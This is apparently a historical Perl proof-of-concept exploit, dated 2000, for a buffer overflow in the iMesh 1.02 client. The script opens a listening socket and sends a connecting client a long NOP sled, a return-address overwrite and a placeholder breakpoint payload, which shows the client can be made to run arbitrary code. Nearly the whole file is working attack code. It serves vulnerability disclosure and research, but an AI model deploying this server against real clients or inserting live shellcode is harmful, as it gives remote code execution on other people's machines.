#!/usr/bin/perl
#
# iMesh 1.02 vulnerability
# Chopsui-cide[MmM] 2000
# http://midgets.box.sk/
#
# ----------------------------------------------------------
# Disclaimer: this file is intended as proof of concept, and
# is not intended to be used for illegal purposes. I accept
# no responsibility for damage incurred by the use of it.
# ----------------------------------------------------------
#
# A buffer overflow exists in iMesh 1.02 that allows the execution
# of arbitrary code. When the iMesh client connects to a server,
# the server is able to exploit the vulnerability and execute
# arbitrary code on the system the client is running on.
#

use IO::Socket;

$localhost = "localhost";
$port = "5000";

# Dummy payload
$payload = "";
$c = 0;
while($c < 0x1aa) {
    $payload .= "\x90";
    $c += 1;
};
$payload .= "\xcc"; # raise exception 03h

$es = "";
$c = 0;
while($c < 0x2723) {
    $es .= "\x90";
    $c += 1;
};
$es .= "\x43\x04\x43\x00";
$c = 0;
while($c < 12) {
    $es .= "\x90";
    $c += 1;
};
$es .= $payload;

#print "$es";

$lsock = IO::Socket::INET->new(Proto=>"tcp", LocalHost=>$localhost, LocalPort=>$port, Listen=>1) || die "unable to create socket
.\n";
print "waiting for connection on port $port...";
$accsock = $lsock->accept();
print "connected.\n";
print $accsock "$es";
sleep(5);
close($accsock);
close($lsock);

